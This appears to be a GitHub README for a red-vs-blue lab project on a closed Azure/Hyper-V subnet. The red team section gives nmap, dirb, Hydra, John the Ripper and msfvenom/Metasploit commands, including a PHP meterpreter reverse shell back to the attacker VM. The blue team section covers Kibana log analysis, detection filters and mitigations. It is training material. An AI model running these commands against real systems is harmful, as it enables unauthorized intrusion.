# Red-vs-Blue Project

## Summary:

>The purpose of this project is to assess, analyze and harden a vulnerable web server, while monitoring its logs
>This project was hosted in Azure Cloud, by leveraging the Hyper-V Manager on a Windows machine. The three virtual machines deployed off Hyper-V are: 
>
>1. The "Capstone VM" - Hostname: Server 1, running the Web Server, FileBeat, MetricBeat and PacketBeat. 
>2. The logs generated are then sent out to the second machine, the "ELK VM" - Hostname: ELK, running Elasticsearch, Logstash and Kibana. 
>3. The attacker machine used in this scenario is the "Kali VM" - Hostname: Kali, running packetbeat.
>
>NOTE: All virtual machines are hosted on the same virtual subnet: 192.168.1.0/24.

Network Diagram:
<img width="1301" alt="Network Diagram" src="https://user-images.githubusercontent.com/90374994/155470755-b24bfbd8-3198-4cb1-b42b-b24092328429.png">



## Red Team - Security Assessment

First step is to run a quick network scan:

```bash
nmap -sV -sS 192.168.1.0/24
```

The result:

![nmap scan](https://user-images.githubusercontent.com/90374994/155526909-55aeea1e-7326-4be4-bd6c-db7885ae215a.png)

We can see the Capstone VM (IP: 192.168.1.105) is hosting a web service on Port 80:

![Website homepage](https://user-images.githubusercontent.com/90374994/155528219-e5c6bdc1-8175-4647-bd95-6e2ba79c84de.png)

To find any hidden files and directories not directly listed on the website we can use Dirbuster (or 'dirb' command from Terminal) by providing it a wordlist to search

```bash
dirb http://192.168.1.105/ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
```

The results show us there are two hidden directories:
  1. http://192.168.1.105/company_folders/secret_folder/
  2. http://192.168.1.105/webdav/

While trying to access the /secret_folder/ directory we are prompted with a warning disclosing the webpage is no longer accessible to the public and a login prompt requesting a username and password:

![secret_folder login](https://user-images.githubusercontent.com/90374994/155529687-3cee176f-441e-4c1c-a5e1-c7746f868931.png)

>NOTE: One clue that is included in the login prompt is "For ashtons eyes only" meaning one of the usernames is potentially "ashton" or "Ashton"

We can try a bruteforcing attack using Hydra and the username "ashton", as well as specifying port 80 and the 'rockyou.txt' wordlist:

```bash
hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder
```

The result of the bruteforce attack eventually returns the password found for user 'ashton' - leopoldo

![hydra result](https://user-images.githubusercontent.com/90374994/155531957-70e44d6d-40be-4353-aa9b-baf009ed0e2a.png)

Now that we are logged in to the /secret_folder/ there is a file '/connect_to_corp_server' containing a personal note

![personal note](https://user-images.githubusercontent.com/90374994/155532390-3e9e0928-1a5d-4088-a99f-5ab40364a42e.png)

The personal note includes information about how to connect to /webdav/ as well as a hint that the username might be "ryan" or "Ryan" together with an MD5 password hash for the account. 

We can try saving the hash into a file named "hash.txt" and use John the Ripper or a website such as https://crackstation.net/ to try and crack the password.
For using John the Ripper:

```bash
john hash.txt --format=raw-md5 --show
```

The result is the password in plain text: linux4u and we can try to login:

![webdav login](https://user-images.githubusercontent.com/90374994/155534746-23c7d436-04d9-4dbd-9c24-46ee76fe3ca8.png)

Now that we can login to the WebDav service we can try and upload malicious content.

![webdav1](https://user-images.githubusercontent.com/90374994/155537659-0e4003d1-0910-4e6e-a7fa-81ee20ae913c.png)

We will try and craft a meterpreter reverse shell using MSFVenom. Since the reverse shell will attempt to connect back to our attacker machine, we will need to specify the LHOST as the Kali VM's IP address and the LPORT as 4444:

```bash
msfvenom -p php/meterpreter/reverse_tcp -lhost=192.168.1.90 lport=4444 > shell.php
```

Now, we can drag and drop the file in the WebDav folder, so we can access it later from the web browser:

![webdav2](https://user-images.githubusercontent.com/90374994/155539922-532ce74a-d5c3-498c-8241-f787deb823da.png)

>NOTE: before accessing the shell.php from the web browser, we first need to start a listener on our machine. Once the listener is up an running we can simply navigate to the shell.php page and we will achieve remote code execution.

Metasploit Console

To fire up Metasploit we can simply run the following command on our Kali machine:

```bash
msfconsole
```

Once metasploit opens up, we can select the following exploit:

```bash
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
```

Before we run the exploit, we have to set the LHOST. We can see this by running the "options" command. We can notice port 4444 is the default port, and is already set, mathcing the php reverse shell we created above. To set the LHOST and start the session, we run the following:

```bash
set LHOST 192.168.1.90
run
```

Now, we can navigate to http://192.168.1.105/webdav/shell.php to start the reverse shell. If everything was executed correctly, we should get a meterpreter shell on our Kali machine:

![metasploit listener](https://user-images.githubusercontent.com/90374994/156852952-9242a9d5-bd04-4ac3-a863-0c95acbd95a9.png)

To find the hidden flag, we can search directly from the meterpreter shell, or we can fire up a shell on the target machine, then run the following:

```bash
find / -name flag.txt 2>/dev/null
```

![Screen Shot 2022-02-15 at 18 51 59 PM](https://user-images.githubusercontent.com/90374994/156853571-5cc65352-fdca-428f-a479-374bbfbe777a.png)

This will look for any files named "flag.txt", ignoring any access errors it encounters, while searching.

Flag found:

![Screen Shot 2022-02-15 at 18 51 08 PM](https://user-images.githubusercontent.com/90374994/156853589-ceec7eb8-0878-4829-8671-88e76f89d631.png)



## Blue Team - Log Analysis and Attack Characterization

>During this phase, we will be able to see and analyze logs, generated from the activities above. The logs were generated using FileBeat, MetricBeat and PacketBeat, and we will leverage Kibana, to analyze them.

Once we fire up Kibana from our Windows host machine (Navigate to to http://192.168.1.105:5601), we will need to add the log data to be analyzed.

Logs to be added:

1. Apache Logs
2. System Logs
3. Apache Metrics
4. System Metrics

>Note: Once the logs and metric data are added, click "Check data" at the bottom and make sure you get a message saying "Data successfully received from this module":

<img width="833" alt="adding_logs" src="https://user-images.githubusercontent.com/90374994/156855428-2abd65c3-e761-4f5e-9ea0-c594ddd4e28e.png">

<img width="797" alt="adding_logs2" src="https://user-images.githubusercontent.com/90374994/156855536-75a8abbb-7bc4-4683-879c-61ec9657d342.png">

>NOTE: you might need to restart your browser once data is added to continue.


Next step is to create a Kibana Dashboard. For this step we will need to add several reports to our dashboard by navigating to Dashboards > Create Dashboard (upper right hand side) > Add an existing.

Search for the following panels and add them to the dashboard:

1.	HTTP status codes for the top queries [Packetbeat] ECS
2.	Top 10 HTTP requests [Packetbeat] ECS
3.	Network Traffic Between Hosts [Packetbeat Flows] ECS
4.	Top Hosts Creating Traffic [Packetbeat Flows] ECS
5.	Connections over time [Packetbeat Flows] ECS
6.	HTTP error codes [Packetbeat] ECS
7.	Errors vs successful transactions [Packetbeat] ECS
8.	HTTP Transactions [Packetbeat] ECS


Now, we are ready to dig in, and find the log events we are looking for.

Navigate to the "Discover" tab and change the filter dropdown to "packetbeat" as this is where the logs will be located. We should also alter the timeline by narrowing it down to only the times we would like to analyze the logs. In this case we used "Feb 14, 2022 @ 00:00:00.0 - Feb 21, 2022 @ 00:00:00.0", however that is a broad range for a normal live environment, so a narrower range could be used in real life example.

First, let's identify the port scan. We can filter for "source.ip:192.168.1.90 AND destination.ip:192.168.1.105 and destination.bytes<60"

![nmap_logs](https://user-images.githubusercontent.com/90374994/156856616-20b7c9ef-a0b5-4a42-9bfa-4df758defbf3.png)

We can tell there was a port scan done due to the spike in traffic, generated at 18:26. To further narrow the results, we can search for packets of under 60 bytes in size, as that should cover most port scans. 


Second, let's find when the attacker accessed the Hidden Folder. We can use the following filter "source.ip:192.168.1.90 AND destination.ip:192.168.1.105 and url.path:"/company_folders/secret_folder/"

![secret_folder](https://user-images.githubusercontent.com/90374994/156857450-7bded495-44fd-4b83-a789-2bdbe97d1e60.png)

This shows the folder was accessed twice from the browser. We can further look into how many times Hydra attempted to Brute Force the login by using the following filter "source.ip:192.168.1.90 AND destination.ip:192.168.1.105 and user_agent.original:"Mozilla/4.0 (Hydra)"

![secret_folder_hydra](https://user-images.githubusercontent.com/90374994/156857691-e856c7f7-4fbd-4a7b-80b1-e26cadc7ebcb.png)

Here, we can see there were 17,866 brute force attempts made to find the correct password for ashton's account


Third, let's look at the WebDAV connection logs. We can apply the following filter: "source.ip:192.168.1.90 AND destination.ip:192.168.1.105 and url.full:"http://192.168.1.105/webdav/"" and we can further narrow it down to when the shell.php was accessed by changing the URL in the search bar to: "url.full:"http://192.168.1.105/webdav/shell.php""

![webdav](https://user-images.githubusercontent.com/90374994/156858793-51b1a743-2e60-469f-8a13-939d42baa9ae.png)

![webdav_shell](https://user-images.githubusercontent.com/90374994/156858816-6bb47b62-6b10-4183-a55c-c21df6d2d74a.png)



## Blue Team - Mitigation Strategies and Proposed Alarms

>NOTE: the threashold for alerts should be tuned accordingly to the environment. This is a small "closed environment", and the numbers used are calculated using current baselines, for our web traffic.

**1. Blocking the Port Scan**
**Mitigation strategies:**
  -first thing we can do is disable ICMP echo requests. This is not return any results for any echo requests:
  
  ```bash
  net.ipv4.icmp_echo_ignore_all = 1
  ```
  
  -second thing we can do is shrink the attack surface an attacker would have access to. In order to achieve this, we should close any unnecessarly open ports, and add firewall rules to stop traffic to/from certain ports exposed to the internet.
  
  -third, we could add an IPS system to activly monitor and detect, blocking port scans specifically.
  
**Alarms**
  -using Kibana, we can create a custom alert that triggers when an unique *Source IP* reaches out to 10 or more ports on the same *Destination IP* within 1 minute time frame


**2. Detecting Unauthorized Access**
**Mitigation strategies:**
  -since the *Secret Folder* is only supposed to be accessed by certain individuals we could create a rule of *White-listed IP Addresses* that would have access to the folder. Anyone outside of the listed IPs would not be able to access it.
  -in this situation, the folder is pretty redundant, serving little to no purpose, and should be removed from the web server completly.
  
**Alarms**
  -create an alarm that triggers when more than 5 "Error 401s" return, when access requests are made to the "/secret_folder/".
  
  
**3. Preventing Brute Force Attacks**
**Mitigation strategies:**
  -limit the number of failed login attempts by changing the account lockout policy.
  -add a Captcha to the login page.
  -enforce a stricter password policy, where users have to use a combination of small letters, capital letters, numbers and symbols, with a minimum password length of 8 characters.
  -request additional information to log in, by leveraging multi factor authentication. 
  -use something similar to *fail2ban* to ban IP addresses that are generating more than 10 failed attempts.
  
**Alarms**
  -first alert should trigger when more than 10 "Error 401" return withing 1 minutes.
  -second alert should trigger immediately if any user agents such as Hydra are being detected.


